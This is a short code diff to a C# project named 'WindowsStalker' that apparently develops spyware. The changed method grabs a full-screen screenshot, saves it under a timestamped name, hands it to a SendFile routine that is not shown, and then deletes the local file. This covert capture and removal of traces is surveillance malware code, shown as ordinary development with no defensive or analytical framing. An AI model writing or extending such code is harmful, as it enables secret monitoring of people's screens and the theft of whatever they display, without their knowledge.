@@ -1,8 +1,8 @@
 ﻿using System;
 using System.Drawing;
 using System.Drawing.Imaging;
+using System.IO;
 using System.Windows.Forms;
-using WindowsStalker.Properties;
 
 namespace WindowsStalker
 {
@@ -23,9 +23,11 @@ namespace WindowsStalker
                 Screen.PrimaryScreen.Bounds.Size,
                 CopyPixelOperation.SourceCopy);
 
-            //TODO hash this
-            bmpScreenshot.Save("tmp.png", ImageFormat.Png);
-            SendFile("xd");
+            string filename = DateTime.Now.ToString("MMddyyyy_hmm_tt") + ".png";
+
+            bmpScreenshot.Save(filename, ImageFormat.Png);
+            SendFile(filename, 1);
+            File.Delete(filename);
         }
     }
 }
